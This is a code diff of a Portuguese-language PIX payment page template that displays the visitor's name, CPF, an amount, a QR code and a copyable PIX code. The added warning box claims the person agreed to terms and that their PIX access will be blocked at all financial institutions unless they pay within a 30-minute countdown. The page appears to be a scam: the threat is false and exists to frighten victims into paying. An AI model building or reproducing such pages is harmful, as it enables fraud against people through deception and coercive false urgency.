@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html>
 <head>
     <script type="text/javascript">
@@ -140,64 +139,30 @@
             background-color: #092555;
             transform: translateY(-1px);
         }
-        .timer-container {
-            background: #f8d7da;
-            border: 1px solid #f5c6cb;
-            color: #721c24;
-            padding: 20px;
+        .warning-box {
+            background-color: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 15px;
             border-radius: 8px;
-            text-align: center;
-            margin: 20px 0;
-            animation: pulse 2s infinite;
-        }
-        .timer {
-            font-size: 36px;
-            font-weight: 700;
-            color: #dc3545;
-            margin: 15px 0;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
-        }
-        .warning-text {
-            font-weight: 600;
-            margin-top: 10px;
-            line-height: 1.4;
-        }
-
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0.4); }
-            70% { box-shadow: 0 0 0 10px rgba(220, 53, 69, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0); }
-        }
-
-        /* Loading screen styles */
-        .loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
-        .loading-spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #0c326f;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
             margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            text-align: center;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .warning-box h2 {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
         }
-        .content {
-            display: none;
+        .warning-box p {
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        .countdown {
+            font-size: 24px;
+            font-weight: bold;
+            color: #dc3545;
+            margin-top: 10px;
         }
         .footer {
             background-color: #01205B;
@@ -225,39 +190,40 @@
         </div>
     </div>
 
-    <!-- Loading Screen -->
-    <div class="loading-screen" id="loadingScreen">
-        <div class="loading-spinner"></div>
-        <p style="font-size: 18px; color: #333;">Gerando transação PIX...</p>
-    </div>
+    <!-- Main Content -->
+    <div class="container">
+        <div class="warning-box">
+            <h2>ATENÇÃO: Ação Necessária!</h2>
+            <p>Sr(a). <strong>{{ nome }}</strong> - CPF: <strong>{{ cpf }}</strong></p>
+            <p>Você concordou com os termos e condições. Caso o pagamento não seja efetuado em até:</p>
+            <div id="countdown" class="countdown">30:00</div>
+            <p>Seu acesso ao sistema PIX será bloqueado em todas as instituições financeiras.</p>
+            <p>Efetue o pagamento imediatamente para evitar a suspensão do serviço.</p>
+        </div>
 
-    <!-- Main Content (initially hidden) -->
-    <div class="content" id="mainContent">
-        <div class="container">
-            <div class="payment-info">
-                <h3>Detalhes do Pagamento</h3>
-                <p><strong>Nome:</strong> {{ nome }}</p>
-                <p><strong>CPF:</strong> {{ cpf }}</p>
-                <p><strong>Valor:</strong> R$ {{ "%.2f"|format(amount) }}</p>
-            </div>
+        <div class="payment-info">
+            <h3>Detalhes do Pagamento</h3>
+            <p><strong>Nome:</strong> {{ nome }}</p>
+            <p><strong>CPF:</strong> {{ cpf }}</p>
+            <p><strong>Valor:</strong> R$ {{ "%.2f"|format(amount) }}</p>
+        </div>
 
-            <div class="qr-container">
-                <h3>Escaneie o QR Code PIX</h3>
-                <div id="qrCode" class="qr-code">
-                    <img src="{{ qr_code }}" alt="QR Code PIX" style="width: 100%; height: 100%; object-fit: contain;">
-                </div>
+        <div class="qr-container">
+            <h3>Escaneie o QR Code PIX</h3>
+            <div id="qrCode" class="qr-code">
+                <img src="{{ qr_code }}" alt="QR Code PIX" style="width: 100%; height: 100%; object-fit: contain;">
             </div>
+        </div>
 
-            <div style="margin: 20px 0;">
-                <p style="margin-bottom: 10px; font-weight: 600;">Ou copie o código PIX:</p>
-                <div id="pixCode" class="pix-code">
-                    {{ pix_code }}
-                </div>
-                <button onclick="copyPixCode()" class="copy-button">
-                    <i class="fas fa-copy"></i>
-                    Copiar código PIX
-                </button>
+        <div style="margin: 20px 0;">
+            <p style="margin-bottom: 10px; font-weight: 600;">Ou copie o código PIX:</p>
+            <div id="pixCode" class="pix-code">
+                {{ pix_code }}
             </div>
+            <button onclick="copyPixCode()" class="copy-button">
+                <i class="fas fa-copy"></i>
+                Copiar código PIX
+            </button>
         </div>
     </div>
 
@@ -269,57 +235,23 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            let transactionId = '{{ transaction_id }}';
-            let checkInterval;
-            let hasRedirected = false;
+            var countDownDate = new Date().getTime() + 30 * 60 * 1000; // 30 minutes from now
 
-            // Get user data from localStorage including phone
-            const userData = JSON.parse(localStorage.getItem('userData') || '{"nome":"","cpf":"","phone":""}');
-            console.log('Loading from localStorage:', userData);
+            var x = setInterval(function() {
+                var now = new Date().getTime();
+                var distance = countDownDate - now;
 
-            function doRedirect() {
-                if (hasRedirected) return;
-                hasRedirected = true;
+                var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                var seconds = Math.floor((distance % (1000 * 60)) / 1000);
 
-                try {
-                    localStorage.setItem('userData', JSON.stringify({
-                        nome: '{{ nome }}',
-                        cpf: '{{ cpf }}',
-                        phone: userData.phone // Preserve phone number
-                    }));
-                    clearInterval(checkInterval);
-                } catch (e) {
-                    console.error('Erro nas operações pós-redirecionamento:', e);
+                document.getElementById("countdown").innerHTML = minutes.toString().padStart(2, '0') + ":" + seconds.toString().padStart(2, '0');
+
+                if (distance < 0) {
+                    clearInterval(x);
+                    document.getElementById("countdown").innerHTML = "EXPIRADO";
                 }
-
-                window.location.href = '/obrigado';
-            }
-
-            function checkPaymentStatus() {
-                if (hasRedirected) return;
-                fetch(`/check-payment-status/${transactionId}?nome={{ nome }}&phone=${userData.phone}`, {
-                    cache: 'no-store'
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.status === 'APPROVED') {
-                        doRedirect();
-                    }
-                })
-                .catch(console.error);
-            }
-
-            // Check status every 2 seconds
-            checkInterval = setInterval(checkPaymentStatus, 2000);
-            checkPaymentStatus(); // Initial check
-
-            // Show content after loading
-            setTimeout(() => {
-                document.getElementById('loadingScreen').style.display = 'none';
-                document.getElementById('mainContent').style.display = 'block';
             }, 1000);
 
-            // Copy PIX code
             window.copyPixCode = function() {
                 const pixCode = document.getElementById('pixCode').textContent.trim();
                 const copyButton = document.querySelector('.copy-button');
